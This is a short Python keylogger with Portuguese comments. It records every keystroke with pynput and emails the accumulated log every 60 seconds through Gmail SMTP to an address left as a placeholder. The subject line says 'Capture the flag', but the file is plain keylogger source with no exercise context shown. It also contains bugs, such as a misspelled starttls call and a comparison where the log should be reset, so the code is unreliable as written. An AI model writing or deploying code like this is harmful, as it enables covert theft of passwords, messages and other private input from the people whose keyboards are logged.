from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

log = ""

#Configurando automação do e-mail
email_rem = "X"
email_co = "X"
auth_email = "X"

def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['SUBJECT'] = "Capture the flag"
        msg['From'] = email_rem
        msg['To'] = email_co
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.startls()
            server.login(email_rem, auth_email)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print("Erro ao enviar", e)

        log == ""

    #Configurando o timer
    Timer(60, enviar_email).start()

#Configurando Logger

ignorar_tecla = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd
}

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
            if key == keyboard.Key.space:
                log += " "
            elif key == keyboard.Key.enter:
                log += "\n"
            elif key == keyboard.Key.tab:
                log += "\t"
            elif key == keyboard.Key.backspace:
                log += "-"
            elif key == keyboard.Key.esc:
                log += "[ESC]"
            elif key in ignorar_tecla:
                pass
            else:
                pass
with keyboard.Listener(on_press=on_press) as listerner:
    enviar_email()
    listerner.join()
    